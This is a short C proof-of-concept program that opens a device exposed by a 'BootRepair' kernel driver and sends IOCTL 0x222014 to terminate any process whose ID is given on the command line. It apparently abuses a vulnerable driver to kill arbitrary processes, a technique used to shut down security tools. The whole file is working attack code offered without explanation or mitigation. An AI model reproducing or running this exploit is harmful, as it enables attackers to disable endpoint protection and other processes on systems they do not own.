#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    if (argc != 2) {
        printf("usage: poc.exe <pid>\n");
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    HANDLE h = CreateFileW(L"\\\\.\\BootRepair", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("[-] open device failed: %d\n", GetLastError());
        return 1;
    }

    DWORD ret;
    if (DeviceIoControl(h, 0x222014, &pid, sizeof(pid), NULL, 0, &ret, NULL))
        printf("[+] killed %d\n", pid);
    else
        printf("[-] ioctl failed: %d\n", GetLastError());

    CloseHandle(h);
    return 0;
}